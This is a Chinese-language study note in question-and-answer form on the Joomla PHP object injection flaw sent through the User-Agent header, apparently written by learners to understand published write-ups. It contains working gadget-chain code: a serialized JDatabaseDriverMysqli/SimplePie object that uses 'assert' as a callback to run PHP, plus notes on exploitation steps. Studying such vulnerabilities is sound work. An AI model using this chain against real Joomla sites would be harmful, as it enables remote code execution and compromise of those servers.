#Weekend From Cao
@(WebPEN)[Joomla, infosec, PHP Object Injection]

>相关文档
>http://drops.wooyun.org/papers/11330
>http://drops.wooyun.org/papers/11371
>http://xteam.baidu.com/?p=379&utm_source=tuicool&utm_medium=referral


1. User-Agent里除了JDatabaserDriverMysqli应该还有别的数据？现在构造User-Agent的时候只写上exp序列化后的字符串不会对打开网页有影响？
 ![Alt text](./1450510616200.png)

>Re:
>我觉得为了保险你把`123}__test`改成 `Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0` 也无所谓，根据我的理解一般User-Agent奏是用来识别客户端的，根据你不同的浏览器和一些组件信息可能会避免一些语法解释上的Bug(?)。UA还有个作用就是识别高频访问是不是恶意的吧，简单来说如果同一个IP用同一个UA高频访问的话可能就DDoS或者是你在扫人家了，如果不同UA的话可能会认为你是个代理？╮(╯▽╰)╭

2.	JDatabaseDriverMysqli类本没有$a成员变量，反序列化构造的字符串后是否可以存在？
```
class JDatabaseDriverMysqli {
    protected $a;
    protected $disconnectHandlers;
    protected $connection;
    function __construct()
    {
        $this->a = new JSimplepieFactory();
        $x = new SimplePie();
        $this->connection = 1;
        $this->disconnectHandlers = [
            [$x, "init"],
        ];
    }
}

$a = new JDatabaseDriverMysqli();
echo serialize($a);
```
![Alt text](./1450510636092.png)
![Alt text](./1450510641396.png)
 
>Re:
>啥？其实我没太懂你在问啥，根据我对字面意思的理解就是“a是怎么出现的？”。。。好吧我还是不懂，感觉那段代码跟后两张图里的东西没关系啊。后面的图应该是说反序列化会把字符串里的命令也解析了。

3. 反序列化后的类中有变量n吗？如果没有，那不需要构造JDatabaseDriverMysqli的其他变量吗？
```
class a{
var $m;
var $n;
}
unserialize(‘O:1:”a”:1:{s:1:”m”;}’);
```
>Re:
>我觉得没关系啊，没有的话就说明没用到啊。

4.	
 ![Alt text](./1450510649034.png)

>Re:
>根据我的理解，这个漏洞的利用分成两步：
>1. 创建一个具有权限的session/把当前session的提权
>2. 利用这个拥有权限的session执行代码	

5.	反序列化JDatabaseDriverMysqli后，是否可能在析构函数执行之前，改变$disconnectHandlers的值？

>Re:
>反序列化后怎么改呢？我不太明白，既然你能在这注入了，为什么不直接改？

6.	$javascript的意义？
```
class SimplePie {
    var $sanitize;
    var $cache;
    var $cache_name_function;
    var $javascript;
    var $feed_url;
    function __construct()
    {
        $this->feed_url = "phpinfo();JFactory::getConfig();exit;";
        $this->javascript = 9999;
        $this->cache_name_function = "assert";
        $this->sanitize = new JDatabaseDriverMysql();
        $this->cache = true;
    }
}
```
>Re:
>应该是为了能让之后JS代码也可以执行吧